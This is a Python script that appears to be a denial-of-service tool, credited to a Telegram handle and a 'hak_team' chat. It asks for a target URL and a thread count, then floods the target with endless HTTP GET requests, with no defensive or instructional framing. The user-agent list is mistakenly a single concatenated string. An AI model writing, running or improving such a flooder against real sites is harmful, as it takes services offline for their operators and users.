import os
import colorama
import threading
import requests
user_agent = (
"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) " "Gecko/20100101 Firefox/50.0" "Mozilla/5.0 (Linux; U; Android 2.3.5; ru-ru; Philips W632 Build/GRJ90) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1" "Mozilla/1.10 [en] (Compatible; RISC OS 3.70; Oregano 1.10)" "ozilla/5.0 (iPhone; CPU iPhone OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/5.1 YaBrowser/13.11.1500.0 Mobile/11B554a Safari/9537.53" "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; PADM00 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/4.4.10" "Android Orbitz/19.15.0 (EHad; Mobiata) app.webview.phone" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Falkon/3.0.1 Chrome/61.0.3163.140 Safari/537.36" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 UBrowser/5.4.5426.1034 Safari/537.36"
)
os.system("clear")
print ("Telegram - @Andreyoss")
print ("Chat - t.me/hak_team")
print ("")
print ("")
print ("")
print ("")
def ddos(target):
    while True:
        try:
            res = requests.get(target, headers={'User-Agent':user_agent})
            print(colorama.Fore.YELLOW + "Request sent!" + colorama.Fore.WHITE)
        except requests.exceptions.ConnectionError:
            print(colorama.Fore.RED + "[+] " + colorama.Fore.LIGHTGREEN_EX + "Connection error!")

url = input("URL: ")

try:
    threads = int(input("Threads: "))
except ValueError:
    exit("Threads count is incorrect!")

if threads == 0:
    exit("Threads count is incorrect!")

if not url.__contains__("http"):
    exit("URL doesnt contains http or https!")

if not url.__contains__("."):
    exit("Invalid domain")

for i in range(threads):
    thr = threading.Thread(target=ddos, args=(url,))
    thr.start()
    print(str(i + 1) + " thread started!")

